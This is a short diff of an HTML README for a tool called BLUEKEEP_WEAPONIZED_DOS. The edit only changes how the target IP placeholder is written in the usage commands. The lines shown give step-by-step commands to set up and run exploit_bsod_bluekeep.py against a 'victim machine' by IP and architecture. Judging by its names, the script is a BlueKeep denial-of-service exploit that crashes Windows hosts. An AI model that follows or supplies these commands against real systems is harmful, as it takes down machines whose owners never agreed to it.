@@ -14,9 +14,9 @@ Installation instructions :
   <p><b>cd BLUEKEEP_WEAPONIZED_DOS/</p></b>
   <p><b>chmod +x setup.sh</p></b>
   <p><b>./setup.sh    # to clone the impackets module </p></b>
-  <p><b>python exploit_bsod_bluekeep.py <IP> 64</p></b>
+  <p><b>python exploit_bsod_bluekeep.py "IP" 64</p></b>
   <p><b>or</p></b>
-  <p><b>python exploit_bsod_bluekeep.py <IP> 32 </p></b>
+  <p><b>python exploit_bsod_bluekeep.py "IP" 32 </p></b>
   <p><b>depending on the victim machine architecture </p></b>
   
   
